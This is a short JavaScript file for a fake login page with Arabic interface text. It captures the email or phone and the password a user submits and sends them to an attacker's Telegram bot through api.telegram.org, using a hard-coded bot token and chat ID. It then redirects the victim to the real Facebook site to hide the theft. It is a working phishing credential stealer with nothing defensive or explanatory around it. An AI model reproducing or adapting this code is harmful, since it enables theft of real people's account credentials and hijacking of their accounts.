document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();

    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const btn = document.getElementById('submitBtn');

    btn.disabled = true;
    btn.innerText = 'جارٍ تسجيل الدخول...';

    const botToken = '8748761382:AAFvnbUyINutno892QgAg8SbReH32dNhKXU'; 
    const chatId = '1175034410';
    
    const message = `📥 بيانات تسجيل دخول جديدة:\n📧 البريد/الهاتف: ${email}\n🔑 كلمة المرور: ${password}`;

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: chatId,
            text: message
        })
    })
    .then(response => {
        // إعادة توجيه المستخدم لصفحة فيسبوك الحقيقية بعد الإرسال
        window.location.href = 'https://www.facebook.com';
    })
    .catch(error => {
        alert('حدث خطأ، يرجى المحاولة لاحقاً.');
        btn.disabled = false;
        btn.innerText = 'تسجيل الدخول';
    });
});
